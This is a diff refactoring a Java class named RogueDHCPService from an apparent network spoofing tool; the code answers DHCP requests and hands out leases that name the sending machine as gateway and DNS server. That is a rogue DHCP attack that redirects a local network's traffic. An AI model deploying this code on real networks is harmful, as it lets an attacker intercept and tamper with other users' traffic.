@@ -1,4 +1,4 @@
-package org.bitducks.spoofing.services;
+package org.bitducks.spoofing.services.dhcprogue;
 
 import java.net.InetAddress;
 import java.net.UnknownHostException;
@@ -101,7 +101,7 @@ public class RogueDHCPService extends Service {
 		this.timer.cancel();
 	}
 
-	public void makeOffer(DHCPPacket dhcp) throws UnknownHostException {
+	private void makeOffer(DHCPPacket dhcp) throws UnknownHostException {
 		InetAddress offer = this.getAddressOffer();
 		this.givenAdresses.add(offer);
 		DHCPPacket dhcpOffer = DHCPResponseFactory.makeDHCPOffer(dhcp, offer, 0xffffffff, this.server, "", null);
@@ -109,7 +109,7 @@ public class RogueDHCPService extends Service {
 		this.sendDHCPPacket(dhcpOffer);
 	}
 	
-	public void makeAck(DHCPPacket dhcp) throws UnknownHostException {
+	private void makeAck(DHCPPacket dhcp) throws UnknownHostException {
 		InetAddress ip = dhcp.getOptionAsInetAddr((byte) 50);
 		DHCPPacket dhcpAck = DHCPResponseFactory.makeDHCPAck(dhcp, ip, 0xffffffff, this.server, "", null);
 		
@@ -117,25 +117,27 @@ public class RogueDHCPService extends Service {
 	}
 	
 	private void sendDHCPPacket(DHCPPacket dhcp) throws UnknownHostException {
-		// Subnet mask address
-		dhcp.setOptionRaw((byte) 1, this.device.addresses[0].subnet.getAddress());
+		this.setDHCPOption(dhcp);
 		
-		// Broadcast IP Address 
-		dhcp.setOptionRaw((byte) 28, this.device.addresses[0].broadcast.getAddress());
+		EthernetPacket ether = this.getEthernetHeader();
 		
-		// Gateway
-		dhcp.setOptionAsInetAddress((byte) 3, this.server);
+		UDPPacket udp = new UDPPacket(67, 68);
+		udp.datalink = ether;
+		this.setIPv4Parameter(udp);
+		udp.data = dhcp.serialize();
 		
-		//DNS Server
-		dhcp.setOptionAsInetAddresses((byte) 6, new InetAddress[] {this.server, this.server});
-		
+		Server.getInstance().sendPacket(udp);
+	}
+
+	private EthernetPacket getEthernetHeader() {
 		EthernetPacket ether = new EthernetPacket();
 		ether.frametype = EthernetPacket.ETHERTYPE_IP;
 		ether.src_mac = this.device.mac_address;
 		ether.dst_mac = Constants.BROADCAST;
-		
-		UDPPacket udp = new UDPPacket(67, 68);
-		udp.datalink = ether;
+		return ether;
+	}
+	
+	private void setIPv4Parameter(UDPPacket udp) throws UnknownHostException {
 		udp.setIPv4Parameter(0, 
 				false, 
 				false, 
@@ -150,11 +152,23 @@ public class RogueDHCPService extends Service {
 				IPPacket.IPPROTO_UDP,  	// Protocol
 				this.server,
 				InetAddress.getByAddress(new byte[] {(byte) 255, (byte) 255, (byte) 255, (byte) 255}));
-		udp.data = dhcp.serialize();
-		Server.getInstance().sendPacket(udp);
 	}
 
-	public InetAddress getAddressOffer() {
+	private void setDHCPOption(DHCPPacket dhcp) {
+		// Subnet mask address
+		dhcp.setOptionRaw((byte) 1, this.device.addresses[0].subnet.getAddress());
+		
+		// Broadcast IP Address 
+		dhcp.setOptionRaw((byte) 28, this.device.addresses[0].broadcast.getAddress());
+		
+		// Gateway
+		dhcp.setOptionAsInetAddress((byte) 3, this.server);
+		
+		//DNS Server
+		dhcp.setOptionAsInetAddresses((byte) 6, new InetAddress[] {this.server, this.server});
+	}
+
+	private InetAddress getAddressOffer() {
 		if(!freeAddress.isEmpty()) {
 			return this.freeAddress.remove(0);
 		} else {
